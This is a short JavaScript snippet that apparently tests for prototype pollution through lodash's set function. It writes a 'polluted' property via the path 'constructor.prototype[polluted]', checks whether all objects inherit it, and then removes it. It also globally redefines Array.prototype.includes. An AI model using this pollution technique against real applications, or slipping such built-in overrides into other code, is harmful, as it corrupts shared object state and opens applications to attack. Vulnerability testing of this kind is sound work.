Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const lod = require('lodash');
let obj = {};
console.log({}.polluted);
lod.set(obj, 'constructor.prototype[polluted]', 'yes');
console.log({}.polluted);
delete obj.__proto__.polluted;